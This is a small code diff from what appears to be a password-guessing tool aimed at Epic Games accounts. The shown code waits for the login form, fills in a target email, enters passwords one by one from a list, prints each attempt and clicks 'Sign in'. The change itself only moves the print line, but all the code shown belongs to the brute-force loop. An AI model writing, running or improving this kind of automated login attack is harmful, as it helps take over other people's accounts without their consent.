@@ -162,8 +162,8 @@ class EpicGames():
 
             print("Waiting for Email Field")
             page.locator('#email').wait_for(timeout=60000)
-            print(f"Trying PASSWORD {self.password_counter + 1} of {self.total_passwords} : {self.passwords[self.password_counter]}")
             page.locator('#email').fill(self.target)
+            print(f"Trying PASSWORD {self.password_counter + 1} of {self.total_passwords} : {self.passwords[self.password_counter]}")
             page.locator('#password').fill(self.passwords[self.password_counter])
             page.locator('button', has_text="Sign in").first.click()
 
